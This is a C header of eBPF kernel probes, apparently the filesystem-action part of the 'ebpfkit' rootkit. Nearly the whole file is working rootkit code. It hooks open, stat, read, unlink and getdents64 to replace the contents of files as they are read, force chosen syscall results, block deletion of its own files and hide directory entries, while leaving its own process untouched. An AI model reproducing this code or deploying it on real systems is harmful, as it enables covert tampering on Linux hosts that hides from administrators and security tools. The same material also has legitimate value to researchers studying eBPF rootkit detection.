/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2021
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _FS_ACTION_H_
#define _FS_ACTION_H_

__attribute__((always_inline)) void fa_override_content(struct pt_regs *ctx, struct fa_fd_attr_t *fd_attr)
{
    struct fa_fd_content_key_t fd_content_key = {
        .id = fd_attr->action.override_id,
        .chunk = fd_attr->override_chunk,
    };

    struct fa_fd_content_t *fd_content = (struct fa_fd_content_t *)bpf_map_lookup_elem(&fa_fd_contents, &fd_content_key);
    if (fd_content)
        bpf_override_return(ctx, fd_content->size);
    else
        bpf_override_return(ctx, 0);

    fd_attr->override_chunk++;
}

__attribute__((always_inline)) u64 get_fs_hash(struct dentry *dentry)
{
    struct inode *d_inode;
    bpf_probe_read(&d_inode, sizeof(d_inode), &dentry->d_inode);

    struct super_block *sb;
    bpf_probe_read(&sb, sizeof(sb), &d_inode->i_sb);

    struct file_system_type *type;
    bpf_probe_read(&type, sizeof(type), &sb->s_type);

    char *name_ptr;
    bpf_probe_read(&name_ptr, sizeof(name_ptr), &type->name);

    char name[32];
    bpf_probe_read_str(&name, sizeof(name), name_ptr);

    u64 hash = FNV_BASIS;
    update_hash_str(&hash, name);

    return hash;
}

__attribute__((always_inline)) int fa_path_attr_matches(struct fa_path_attr_t *path_attr, struct dentry *dentry)
{
    if (path_attr->fs_hash && path_attr->fs_hash != get_fs_hash(dentry))
        return 0;

    if (path_attr->comm_hash && path_attr->comm_hash != get_comm_hash())
        return 0;

    return 1;
}

__attribute__((always_inline)) struct fa_path_attr_t *get_path_attr(struct dentry *dentry)
{
    struct qstr qstr;
    struct dentry *d_parent;
    struct inode *d_inode = NULL;
    char name[FS_MAX_SEGMENT_LENGTH + 1];
    int end = 0;

    struct fa_path_key_t key = {
        .hash = FNV_BASIS,
    };

#pragma unroll
    for (int i = 0; i < 15; i++)
    {
        d_parent = NULL;
        bpf_probe_read(&d_parent, sizeof(d_parent), &dentry->d_parent);

        if (dentry != d_parent)
            bpf_probe_read(&d_inode, sizeof(d_inode), &d_parent->d_inode);

        bpf_probe_read(&qstr, sizeof(qstr), &dentry->d_name);
        bpf_probe_read_str(&name, sizeof(name), (void *)qstr.name);

        if (IS_PATH_SEP(name[0]))
        {
            name[0] = '/';
            end = 1;
        }

        key.hash = FNV_BASIS;
        update_hash_str(&key.hash, name);

        struct fa_path_attr_t *path_attr = bpf_map_lookup_elem(&fa_path_attrs, &key);
        if (!path_attr)
            key.pos = 0;
        else
        {
            if (path_attr->action.id && fa_path_attr_matches(path_attr, dentry))
                return path_attr;
            key.pos++;
        }

        if (end)
            return 0;

        dentry = d_parent;
    }

    return 0;
}

__attribute__((always_inline)) int fa_access_path(struct path *path)
{
    u64 ebpfkit_pid;
    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    if (ebpfkit_pid == pid_tgid >> 32)
        return 0;

    struct dentry *dentry;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);

    struct fa_path_attr_t *path_attr = get_path_attr(dentry);
    if (!path_attr)
        return 0;

    struct fa_fd_action_t fd_action = {
        .action = path_attr->action,
    };
    bpf_map_update_elem(&fa_fd_actions, &pid_tgid, &fd_action, BPF_ANY);

    return 0;
}

__attribute__((always_inline)) int fa_path_accessed(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = (u64)PT_REGS_RC(ctx),
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t fd_attr = {
        .action = fd_action->action,
    };
    bpf_map_update_elem(&fa_fd_attrs, &fd_key, &fd_attr, BPF_ANY);

    if (fd_attr.action.id & FA_OVERRIDE_RETURN_ACTION)
        bpf_override_return(ctx, fd_attr.action.return_value);

    return 0;
}

__attribute__((always_inline)) int fa_handle_close(int fd)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();

    bpf_map_delete_elem(&fa_fd_actions, &pid_tgid);
    bpf_map_delete_elem(&fa_getdents, &pid_tgid);

    struct fa_fd_key_t fd_key = {
        .fd = fd,
        .pid = pid_tgid >> 32,
    };

    bpf_map_delete_elem(&fa_fd_attrs, &fd_key);

    return 0;
}

SYSCALL_KPROBE1(close, int, fd)
{
    return fa_handle_close(fd);
}

__attribute__((always_inline)) int fa_handle_unlink(struct pt_regs *ctx, const char *filename)
{
    u64 ebpfkit_hash;
    LOAD_CONSTANT("ebpfkit_hash", ebpfkit_hash);

    if (!ebpfkit_hash)
        return 0;

    const char basename[256];
    bpf_probe_read_str((void *)basename, sizeof(basename), (void *)filename);

    u64 hash = FNV_BASIS;

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (basename[i] == '\0')
        {
            if (hash == ebpfkit_hash)
                bpf_override_return(ctx, -ENOENT);
        }
        else if (basename[i] == '/')
            hash = FNV_BASIS;
        else
            update_hash_byte(&hash, basename[i]);
    }

    return 0;
}

SYSCALL_KPROBE1(unlink, const char *, filename)
{
    return fa_handle_unlink(ctx, filename);
}

SYSCALL_KPROBE2(unlinkat, int, fd, const char *, filename)
{
    return fa_handle_unlink(ctx, filename);
}

SYSCALL_COMPAT_KRETPROBE(open)
{
    return fa_path_accessed(ctx);
}

SYSCALL_COMPAT_KRETPROBE(openat)
{
    return fa_path_accessed(ctx);
}

SEC("kprobe/vfs_open")
int _vfs_open(struct pt_regs *ctx)
{
    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
    return fa_access_path(path);
}

SEC("kprobe/vfs_getattr")
int _vfs_getattr(struct pt_regs *ctx)
{
    struct path *path = (struct path *)PT_REGS_PARM1(ctx);
    return fa_access_path(path);
}

SYSCALL_KRETPROBE(stat)
{
    return fa_path_accessed(ctx);
}

SYSCALL_KRETPROBE(lstat)
{
    return fa_path_accessed(ctx);
}

SYSCALL_KRETPROBE(newlstat)
{
    return fa_path_accessed(ctx);
}

SYSCALL_KRETPROBE(fstat)
{
    return fa_path_accessed(ctx);
}

SYSCALL_KPROBE2(read, int, fd, char *, buf)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_key_t fd_key = {
        .fd = fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & FA_OVERRIDE_RETURN_ACTION)
    {
        bpf_override_return(ctx, fd_attr->action.return_value);
        return 0;
    }

    fd_attr->read_buf = buf;

    struct fa_fd_action_t fd_action = {
        .fd = fd,
        .action = fd_attr->action,
    };
    bpf_map_update_elem(&fa_fd_actions, &pid_tgid, &fd_action, BPF_ANY);

    return 0;
}

SEC("kretprobe/vfs_read")
int _vfs_read(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid);
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = fd_action->fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & FA_OVERRIDE_CONTENT_ACTION)
        bpf_tail_call(ctx, &fa_progs, FA_OVERRIDE_CONTENT_PROG);
    else
        bpf_tail_call(ctx, &fa_progs, fd_attr->action.id);

    return 0;
}

__attribute__((always_inline)) int fa_handle_read_ret(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_action_t *fd_action = (struct fa_fd_action_t *)bpf_map_lookup_elem(&fa_fd_actions, &pid_tgid); 
    if (!fd_action)
        return 0;

    struct fa_fd_key_t fd_key = {
        .fd = fd_action->fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    if (fd_attr->action.id & FA_OVERRIDE_CONTENT_ACTION)
    {
        if (fd_attr->action.id & FA_APPEND_CONTENT_ACTION)
        {
            int ret = (int)PT_REGS_RC(ctx);
            if (!ret)
                fa_override_content(ctx, fd_attr);
        }
        else
            fa_override_content(ctx, fd_attr);
    }
    else if (fd_attr->action.id & FA_OVERRIDE_RETURN_ACTION)
    {
        bpf_override_return(ctx, fd_attr->action.return_value);

        if (fd_attr->action.id & FA_KMSG_ACTION)
            fd_attr->action.id &= ~FA_OVERRIDE_RETURN_ACTION;
    }

    return 0;
}

SYSCALL_KRETPROBE(read)
{
    return fa_handle_read_ret(ctx);
}

SEC("kprobe/__x64_sys_getdents64")
int __x64_sys_getdents64(struct pt_regs *ctx)
{
    ctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int fd;
    bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(ctx));

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_fd_key_t fd_key = {
        .fd = fd,
        .pid = pid_tgid >> 32,
    };

    struct fa_fd_attr_t *fd_attr = (struct fa_fd_attr_t *)bpf_map_lookup_elem(&fa_fd_attrs, &fd_key);
    if (!fd_attr)
        return 0;

    struct linux_dirent64 *dirent;
    bpf_probe_read(&dirent, sizeof(dirent), &PT_REGS_PARM2(ctx));

    struct fa_getdents_t getdents = {
        .dirent = dirent,
        .hidden_hash = fd_attr->action.hidden_hash,
    };

    bpf_map_update_elem(&fa_getdents, &pid_tgid, &getdents, BPF_ANY);

    return 0;
}

SYSCALL_KRETPROBE(getdents64)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct fa_getdents_t *getdents = (struct fa_getdents_t *)bpf_map_lookup_elem(&fa_getdents, &pid_tgid);
    if (!getdents)
        return 0;

    bpf_tail_call(ctx, &fa_progs, FA_OVERRIDE_GET_DENTS_PROG);

    return 0;
}

#endif
